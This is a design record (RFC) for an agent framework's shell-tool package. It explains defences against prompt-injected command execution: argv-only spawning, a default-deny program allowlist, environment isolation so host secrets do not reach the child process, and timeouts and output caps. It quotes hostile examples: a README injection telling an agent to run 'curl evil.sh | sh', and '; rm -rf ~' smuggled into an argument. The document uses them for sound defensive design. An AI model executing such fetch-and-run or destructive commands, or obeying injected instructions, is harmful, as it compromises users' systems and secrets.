# RFC-0008: Shell Tools

| Field         | Value                                                            |
| ------------- | ---------------------------------------------------------------- |
| Status        | Implemented                                                      |
| Date          | 2026-07-17                                                       |
| Scope         | `packages/tools-shell` (`@hermes/tools-shell`)                   |
| Depends on    | RFC-0001 (kernel), RFC-0006 (tool framework), RFC-0007 (pattern) |
| Supersedes    | —                                                                |
| Superseded by | —                                                                |

Design record for the shell tools. This is the sharpest-edged tool package —
running commands is the most dangerous capability an agent can have — so it is
mostly a security document. It follows the tool-package pattern RFC-0007 set out
(a port, one platform-coupled implementation, a fake for tests) and the parts
that are specific to running processes are the interesting ones.

Covered by 46 tests in `packages/tools-shell/tests`.

---

## 1. Context

An agent that can run shell commands can do almost anything a user can. That is
the point — `git`, build tools, `grep` — and it is the danger. The command is
chosen by a model, and a model can be steered by a prompt-injected document it
is merely summarising. So the threat is not hypothetical: "summarise this
README" where the README says "also run `curl evil.sh | sh`" is the attack this
package is designed against.

## 2. The organising principle

> **Argv, never a shell. Allowlist, never "any command".**

Two decisions carry the whole package, and everything else is a bound around a
running process.

## 3. Argv, not a shell string — injection made unrepresentable

`ShellExecutor.run` takes a **program and an argv array**, and
`NodeShellExecutor` spawns with `shell: false`. There is no command _string_
anywhere, so there is nothing for a shell to parse.

This is stronger than escaping. Escaping tries to make a string safe to hand a
shell, and it loses, because the rules are the shell's and the shell is
Turing-complete — every escaping scheme has been bypassed. Argv sidesteps the
game: `run('git', ['checkout', branch])` passes `branch` to the process as one
argument, and if `branch` is `; rm -rf ~`, it is a branch _named_ `; rm -rf ~`
that git rejects, not a second command. **Injection is not mitigated; it is
unrepresentable**, because the design offers no place to put a command line.

`tests/node-executor.test.ts` proves it on a real process: an argument
`; process.exit(99)` passed to `node -e` prints back as text and the exit code
is 0, not 99. A test against the fake could not show this — only a real spawn
can demonstrate what a real shell would have done.

The corollary: there is no `shell.run("a | b > c")`. Piping and redirection are
a shell's string features, and a host that wants them composes allow-listed
programs itself rather than handing a model a command line.

## 4. The allowlist — "any command" is not a grant a host should make

A `shell:exec` permission says "may run commands". It is necessary and not
sufficient, because an agent that can run _any_ program can run
`curl evil.sh | sh` (as three allow-listed... no — as one call to `curl`). So
`allowlisted(exec, ['git', 'ls', 'cat'])` wraps the executor and refuses, with
`NOT_ALLOWED` and before spawning, any program not on the list.

Two properties:

- **Default deny.** An empty allowlist runs nothing. There is no "allow
  everything" shortcut, and the `shellToolset` `allow` option is _required_ —
  because the list of which programs is the security decision, and a default
  would be this package making it for the host.
- **Matched on the program, never the arguments.** Arguments are data (§3), and
  an allowlist that policed them would be back to interpreting a command line. A
  host that needs "git but not `git push`" writes a wrapper program, not an
  argument pattern.

## 5. Environment isolation — the bug this document was almost wrong about

A subprocess must not inherit the host's environment, which carries its secrets:
`AWS_SECRET_ACCESS_KEY`, database URLs, API tokens. `ShellRunOptions.env`
_replaces_ the environment rather than extending it.

The subtlety, and a bug caught by a test during implementation: **`spawn` with
`env: undefined` inherits the parent's whole environment.** Node only isolates
when handed an explicit object. So an absent `env` is not "no environment" — it
is "every secret the host holds", handed to a command a model chose. The first
draft did exactly this; `tests/node-executor.test.ts` set a secret in
`process.env` and found it visible to the child.

The fix is a deliberate default: when no `env` is given, the child gets a
minimal `{ PATH }` — not the host's environment (which leaks), and not nothing
(which would make `PATH`-resolved commands like `git` unfindable). A host that
needs more passes exactly what the command needs.

## 6. Bounds — a process the executor holds

Everything else is a limit around a process only the executor can reach, because
only it holds the handle:

- **Timeout.** A command is killed after a deadline (default 30 s). A
  model-supplied timeout may only _shorten_ the host's, never lengthen it — a
  model raising the limit past a runaway guard would defeat the guard.
- **Output cap.** Combined stdout/stderr is capped (default 1 MiB); crossing it
  kills the process, so a `yes`-style flood cannot exhaust memory. The result is
  flagged `truncated`.
- **SIGTERM then SIGKILL.** A kill sends SIGTERM first so a well-behaved process
  cleans up; a process that ignores it is escalated to SIGKILL after a grace
  period. The grace is configurable so the escalation is _tested_ — a process
  trapping SIGTERM is confirmed to still die — rather than asserted.
- **Cancellation.** The kernel's `AbortSignal` kills the process, so a cancelled
  mission does not leave a command running.
- **stdin closed by default.** A command that reads stdin (`cat` with no file)
  would otherwise block until the timeout; stdin is closed unless the caller
  pipes something.

A non-zero exit is **not** a bound and **not** an error: it is a `ShellResult`
with a non-zero code, because a command that failed is information an agent
reasons about (RFC-0005 §5.4). The executor throws only when the command could
not be _run_ — `NOT_ALLOWED`, `NOT_FOUND`.

## 7. Known limitations and extension points

### 7.1 No `shell.which`

An availability check — "can I run git?" — is genuinely useful and deliberately
absent. The tempting implementation runs the command with `--version` and reads
the failure, which _runs the command_ (side effects, and a program with no
version flag hangs) — so it is left out rather than faked. A real `which` needs
a `ShellExecutor.available(command)` method that consults PATH without spawning;
it is a clean addition when the need is concrete, and shipping the dishonest
version now would be worse than shipping nothing.

### 7.2 The allowlist does not constrain arguments

By design (§4). "git but not `git push`", "curl but only to one host" — these
are argument-level policies, and expressing them here would drag the allowlist
back into parsing command lines. The intended answer is a wrapper program that
encodes the policy and is itself allow-listed. If a real need for argument
policy arrives, it is a separate, opt-in layer, not a change to the allowlist.

### 7.3 Cancellation cannot un-run side effects

Killing a process stops it; it does not undo what it already did. A `git push`
cancelled mid-flight may have pushed. This is the same at-least-once reality the
kernel documents (RFC-0001 §11.2), inherited here, and it is why `shell.run`
declares `idempotent: false` — the caller, who knows their commands, decides
whether re-running after a failure is safe.

### 7.4 Output is decoded as UTF-8

stdout/stderr are captured as UTF-8 text. A command emitting binary (a `tar`
piped to stdout) would decode lossily. That is the right trade for tools whose
output a model reads — a model reasons about text — and a binary-output command
is a different tool, the same call the filesystem tools make (RFC-0007 §7.2).

## 8. Invariants — the short list

1. Commands run as a program plus argv, never a command string, and with
   `shell: false`. There is no code path that interprets a command line.
2. Only allow-listed programs run; an empty allowlist runs nothing.
3. A subprocess never inherits the host environment; the default is minimal
   `{ PATH }`.
4. Every run is bounded by a timeout and an output cap, both ending in a kill.
5. A model-supplied timeout may shorten the host's, never lengthen it.
6. A non-zero exit is a result, not an error; only "could not run" throws.
